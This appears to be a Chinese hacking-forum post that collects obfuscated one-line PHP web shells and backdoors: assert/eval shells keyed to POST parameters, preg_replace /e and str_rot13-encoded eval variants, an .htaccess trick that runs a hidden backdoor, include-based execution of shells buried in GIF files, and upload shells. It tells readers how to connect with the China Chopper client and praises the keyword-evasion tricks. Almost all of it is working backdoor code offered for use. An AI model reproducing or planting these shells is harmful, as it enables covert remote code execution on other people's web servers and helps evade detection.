三个变形的一句话PHP木马
第一个
<?php ($_=@$_GET[2]).@$_($_POST[1])?> 在菜刀里写http://site/1.php?2=assert 密码是1 
<?=($_=@$_GET[2]).@$_($_GET[1])?>  在菜刀里写http://site/1.php?2=assert 密码是1 
第二个
<?php
$_="";
$_[+""]='';
$_="$_"."";
$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
?>
<?php ${'_'.$_}['_'](${'_'.$_}['__']);?> 在菜刀里写http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。 
第三个
($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！

.htaccess做PHP后门
这个其实在2007年的时候作者GaRY就爆出了，只是后边没人关注，这个利用关键点在于一句话：

AddType application/x-httpd-php .htaccess
###### SHELL ###### 这里写上你的后门吧###### LLEHS ######

最后列几个高级的PHP一句话木马后门：
1、
$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$hh("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
2、
$filename=$_GET['xbid'];
include ($filename);
//危险的include函数，直接编译任何文件为php格式运行
3、
$reg="c"."o"."p"."y";
$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
//重命名任何文件
4、
$gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$gzid("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
5、include ($uid);
//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif
//gif插一句话
6、典型一句话
程序后门代码
<?php eval_r($_POST[sb])?>
程序代码
<?php @eval_r($_POST[sb])?>
//容错代码
程序代码
<?php assert($_POST[sb]);?>
//使用lanker一句话客户端的专家模式执行相关的php语句
程序代码
<?$_POST['sa']($_POST['sb']);?>
程序代码
<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
程序代码
<?php
@preg_replace("/[email]/e",$_POST['h'],"error");
?>
//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
程序代码
<O>h=@eval_r($_POST1);</O>
程序代码
<script language="php">@eval_r($_POST[sb])</script>
//绕过<?限制的一句话
